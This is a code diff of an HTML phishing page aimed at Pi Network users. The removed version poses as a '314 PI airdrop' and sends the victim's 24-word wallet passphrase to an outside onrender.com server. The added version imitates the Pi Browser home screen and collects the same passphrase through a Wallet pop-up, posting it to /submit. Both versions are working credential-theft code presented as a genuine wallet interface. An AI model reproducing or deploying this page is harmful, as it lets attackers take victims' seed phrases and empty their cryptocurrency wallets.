@@ -3,158 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unlock Pi Reward</title>
+    <title>Pi Browser Interface</title>
     <style>
-        /* General reset */
-        * {
+        body {
             margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #fdfdfd;
         }
 
-        body {
-            font-family: Arial, sans-serif;
+        /* Header */
+        .header {
+            background-color: #822d8c;
+            padding: 10px;
+            color: #fff;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        /* Icon Grid */
+        .icon-container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 30px;
+            justify-items: center;
+        }
+
+        .icon {
+            width: 100px;
+            height: 100px;
             display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #fff;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+        }
+
+        .icon img {
+            width: 40px;
+            height: 40px;
+        }
+
+        .icon p {
+            margin-top: 8px;
+            color: #822d8c;
+            font-weight: bold;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            background-color: #f4f4f4;
-            margin: 0;
-            overflow-x: hidden;
         }
 
-        .container {
+        .modal-content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
             width: 90%;
             max-width: 400px;
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-            text-align: center;
         }
 
-        /* Header Styling */
-        .header {
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 32px;
-            font-weight: bold;
-            color: #4A148C;
-            text-shadow: 0px 2px 6px rgba(74, 20, 140, 0.6);
-            animation: fade-in 1.5s ease-in-out;
-            margin-bottom: 8px;
-        }
-
-        .header h2 {
-            font-size: 20px;
-            font-weight: 500;
-            color: #FF6F00;
-            text-shadow: 0px 1px 4px rgba(255, 111, 0, 0.7);
-            margin-bottom: 20px;
-        }
-
-        @keyframes fade-in {
-            0% {
-                opacity: 0;
-                transform: scale(0.9);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
-        /* Form Styling */
-        h3 {
-            font-size: 22px;
-            color: #5a2da2;
-            margin-bottom: 20px;
-        }
-
-        textarea {
-            width: 100%;
-            height: 100px;
-            padding: 10px;
-            font-size: 14px;
+        .modal input {
+            width: 90%;
+            margin: 10px auto;
+            padding: 8px;
             border: 1px solid #ccc;
-            border-radius: 4px;
-            resize: none;
+            border-radius: 5px;
         }
 
-        button {
-            width: 100%;
-            background-color: #5a2da2;
+        .modal button {
+            background: #822d8c;
             color: white;
+            padding: 10px 20px;
             border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 4px;
+            border-radius: 5px;
             cursor: pointer;
-            margin-top: 20px;
-        }
-
-        button:hover {
-            background-color: #4a2390;
-        }
-
-        /* Info Text */
-        .info-text {
-            font-size: 12px;
-            color: #555;
-            margin-top: 20px;
-            line-height: 1.5;
-        }
-
-        .info-text a {
-            color: #5a2da2;
-            text-decoration: none;
-        }
-
-        .info-text a:hover {
-            text-decoration: underline;
+            font-weight: bold;
         }
     </style>
-    <script>
-        // Clear passphrase on page reload
-        window.onload = function() {
-            document.getElementById("passphrase").value = "";
-        };
-
-        function validatePassphrase() {
-            const passphrase = document.getElementById("passphrase").value.trim();
-            const wordCount = passphrase.split(" ").filter(word => word).length;
-
-            if (wordCount !== 24) {
-                alert("Please enter a valid 24-word passphrase.");
-                return false;
-            }
-            return true;
-        }
-    </script>
 </head>
 <body>
-    <div class="container">
-        <!-- Header Section -->
-        <div class="header">
-            <h1>Airdrop from Pi Network</h1>
-            <h2>Claim Your 314 PI Coins Now</h2>
-        </div>
+    <div class="header">Home 🚀</div>
+    <h2 style="color: #f59e0b;">Welcome to the Pi Browser</h2>
 
-        <!-- Form Section -->
-        <h3>Unlock Pi Reward</h3>
-        <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
-            <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
-            <button type="submit">Unlock with passphrase</button>
-        </form>
+    <div class="icon-container">
+        <div class="icon"><img src="#" alt="Fireside"><p>Fireside</p></div>
+        <div class="icon" id="wallet"><img src="#" alt="Wallet"><p>Wallet</p></div>
+        <div class="icon"><img src="#" alt="Brainstorm"><p>Brainstorm</p></div>
+        <div class="icon"><img src="#" alt="Mine"><p>Mine</p></div>
+        <div class="icon"><img src="#" alt="Blockchain"><p>Blockchain</p></div>
+        <div class="icon"><img src="#" alt="Develop"><p>Develop</p></div>
+    </div>
 
-        <!-- Info Section -->
-        <div class="info-text">
-            As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase. <br><br>
-            Lost your wallet passphrase? <a href="#">you can create a new wallet</a>, but all the Pi numbers in your previous wallet will be inaccessible.
+    <!-- Modal -->
+    <div class="modal" id="passphraseModal">
+        <div class="modal-content">
+            <h3>Enter Your Passphrase</h3>
+            <form id="passphraseForm">
+                <input type="text" id="passphrase" placeholder="Enter 24-word passphrase" required>
+                <button type="submit">Submit</button>
+            </form>
         </div>
     </div>
+
+    <script>
+        const walletIcon = document.getElementById('wallet');
+        const modal = document.getElementById('passphraseModal');
+        const passphraseForm = document.getElementById('passphraseForm');
+
+        // Show modal when Wallet is clicked
+        walletIcon.addEventListener('click', () => {
+            modal.style.display = 'flex';
+        });
+
+        // Handle form submission
+        passphraseForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const passphrase = document.getElementById('passphrase').value;
+
+            const response = await fetch('/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ passphrase })
+            });
+
+            const result = await response.text();
+            alert(result);
+
+            if (response.ok) {
+                modal.style.display = 'none';
+            }
+        });
+
+        // Close modal on outside click
+        window.onclick = (e) => {
+            if (e.target === modal) {
+                modal.style.display = 'none';
+            }
+        };
+    </script>
 </body>
 </html>
